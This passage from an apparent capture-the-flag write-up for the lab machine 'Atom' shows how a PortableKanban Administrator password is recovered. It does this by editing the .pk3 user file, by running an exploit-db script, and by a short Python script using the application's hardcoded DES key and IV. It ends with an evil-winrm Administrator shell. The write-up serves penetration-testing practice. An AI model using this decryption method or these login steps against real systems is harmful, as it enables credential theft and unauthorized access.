+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Exploit-db contains a <code class="language-plaintext highlighter-rouge">PortableKanban Encrypted Password Retrieval</code>: <a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a>
+But the python script expects a <code class="language-plaintext highlighter-rouge">PortableKanban.pk3</code> formatted file.</li>
+</ul>
+
+<h2 id="method-1">Method 1</h2>
+<p>I transferred the portable-kanban directory present in the box to a local Windows VM. Tried to make a pk3 file and modify it.
+But the configuration tries to find a local server running on 6379 (redis on atom) which isn’t on my VM.</p>
+<ul>
+  <li>Remove .cfg and .pk3.lock file then start portablekanban.exe</li>
+  <li>Choose create a local file, which will make a .pk3 file and .pk3.bak</li>
+  <li>Logon with user Administrator with no password
+Or you can get kanban from: <a href="https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml">https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml</a></li>
+</ul>
+
+<p>PortableKanban.pk3 looks like with the users data from redis database:</p>
+<ul>
+  <li>Changed the no password username to <code class="language-plaintext highlighter-rouge">caretaker-admin</code> just to differentiate users and keeping the Id same works.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>PortableKanban.pk3 | jq
+<span class="o">{</span>
+<span class="s2">"Columns"</span>: <span class="o">[]</span>,
+<span class="s2">"Tasks"</span>: <span class="o">[]</span>,
+<span class="s2">"TimeTracks"</span>: <span class="o">[]</span>,
+<span class="s2">"Persons"</span>: <span class="o">[]</span>,
+<span class="s2">"Topics"</span>: <span class="o">[]</span>,
+<span class="s2">"Tags"</span>: <span class="o">[]</span>,
+<span class="s2">"Views"</span>: <span class="o">[]</span>,
+<span class="s2">"Users"</span>: <span class="o">[</span>
+  <span class="o">{</span>
+    <span class="s2">"Id"</span>: <span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span>,
+    <span class="s2">"Name"</span>: <span class="s2">"caretaker-admin"</span>,
+    <span class="s2">"Initials"</span>: <span class="s2">""</span>,
+    <span class="s2">"Email"</span>: <span class="s2">""</span>,
+    <span class="s2">"EncryptedPassword"</span>: <span class="s2">""</span>,
+    <span class="s2">"Role"</span>: <span class="s2">"Admin"</span>,
+    <span class="s2">"Inactive"</span>: <span class="nb">false</span>,
+    <span class="s2">"TimeStamp"</span>: 637608661388664800
+  <span class="o">}</span>,
+  <span class="o">{</span>
+    <span class="s2">"Id"</span>: <span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span>,
+    <span class="s2">"Name"</span>: <span class="s2">"Administrator"</span>,
+    <span class="s2">"Initials"</span>: <span class="s2">""</span>,
+    <span class="s2">"Email"</span>: <span class="s2">""</span>,
+    <span class="s2">"EncryptedPassword"</span>: <span class="s2">"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"</span>,
+    <span class="s2">"Role"</span>: <span class="s2">"Admin"</span>,
+    <span class="s2">"Inactive"</span>: <span class="nb">false</span>,
+    <span class="s2">"TimeStamp"</span>: 637530169606440200
+  <span class="o">}</span>
+<span class="o">]</span>,
+<span class="s2">"ServiceMessages"</span>: <span class="o">[]</span>,
+<span class="s2">"CustomFieldDescriptors"</span>: <span class="o">[]</span>,
+<span class="s2">"MetaData"</span>: <span class="o">{</span>
+  <span class="s2">"Id"</span>: <span class="s2">"ffffffffffffffffffffffffffffffff"</span>,
+  <span class="s2">"SchemaVersion"</span>: <span class="s2">"4.2.0.0"</span>,
+  <span class="s2">"SchemaVersionModified"</span>: <span class="s2">"/Date(1625269320000+0530)/"</span>,
+  <span class="s2">"SchemaVersionModifiedBy"</span>: <span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span>,
+  <span class="s2">"SchemaVersionChecked"</span>: <span class="s2">"/Date(-62135596800000-0000)/"</span>,
+  <span class="s2">"SchemaVersionCheckedBy"</span>: <span class="s2">"00000000000000000000000000000000"</span>,
+  <span class="s2">"TimeStamp"</span>: 637608661419764600
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Login with <code class="language-plaintext highlighter-rouge">caretaker-admin</code> and no password</li>
+  <li>Go to settings, uncheck the “Hide passwords” option: Password for <code class="language-plaintext highlighter-rouge">Administrator\atom</code> is <code class="language-plaintext highlighter-rouge">kidvscat_admin_@123</code>
+<img src="/assets/img/Posts/Atom/kanban.png" alt="kanban" /></li>
+</ul>
+
+<h2 id="method-2">Method 2</h2>
+<p>You can even crack the password with exploit-db’s python script.
+PortableKanban.pk3:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"Columns"</span><span class="p">:[],</span><span class="nl">"Tasks"</span><span class="p">:[],</span><span class="nl">"TimeTracks"</span><span class="p">:[],</span><span class="nl">"Persons"</span><span class="p">:[],</span><span class="nl">"Topics"</span><span class="p">:[],</span><span class="nl">"Tags"</span><span class="p">:[],</span><span class="nl">"Views"</span><span class="p">:[],</span><span class="nl">"Users"</span><span class="p">:[{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"Administrator"</span><span class="p">,</span><span class="nl">"Initials"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"Email"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="s2">"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"</span><span class="p">,</span><span class="nl">"Role"</span><span class="p">:</span><span class="s2">"Admin"</span><span class="p">,</span><span class="nl">"Inactive"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637530169606440253</span><span class="p">}],</span><span class="nl">"ServiceMessages"</span><span class="p">:[],</span><span class="nl">"CustomFieldDescriptors"</span><span class="p">:[],</span><span class="nl">"MetaData"</span><span class="p">:{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"ffffffffffffffffffffffffffffffff"</span><span class="p">,</span><span class="nl">"SchemaVersion"</span><span class="p">:</span><span class="s2">"4.2.0.0"</span><span class="p">,</span><span class="nl">"SchemaVersionModified"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1625269320000+0530)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"SchemaVersionModifiedBy"</span><span class="p">:</span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="nl">"SchemaVersionChecked"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(-62135596800000-0000)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"SchemaVersionCheckedBy"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637608661419764547</span><span class="p">}}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Decrypt password:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 49409.py ./PortableKanban.pk3
+Administrator:kidvscat_admin_@123
+</pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+
+<h2 id="method-3">Method 3</h2>
+<p>You can modify the whole script to decrypt encrypted password without ever installing Kanban in the first place.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">des</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">hash</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="nb">hash</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">DesKey</span><span class="p">(</span><span class="sa">b</span><span class="s">"7ly6UznJ"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">hash</span><span class="p">,</span><span class="n">initial</span><span class="o">=</span><span class="sa">b</span><span class="s">"XuVUm5fR"</span><span class="p">,</span><span class="n">padding</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 modified_exploit.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
+kidvscat_admin_@123
+</pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+
+<p>Get Administrator with <code class="language-plaintext highlighter-rouge">evil-winrm</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.237 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'kidvscat_admin_@123'</span>
+
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>atom<span class="se">\a</span>dministrator
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
